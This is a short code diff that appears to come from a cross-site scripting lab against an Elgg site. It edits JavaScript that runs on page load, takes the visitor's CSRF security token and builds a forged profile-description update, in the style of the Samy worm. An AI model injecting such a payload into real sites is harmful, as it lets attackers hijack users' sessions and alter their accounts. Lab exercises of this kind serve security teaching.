@@ -8,7 +8,7 @@ window.onload = function(){
     var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
 
     // Construct the content of your URL.
-    var content = "description=" + encodeURIComponent("I work at Google as a dog walker."); 
+    var content = "&description=" + encodeURIComponent("I work at Google as a dog walker."); 
 
     var samyGuid = 59;
 
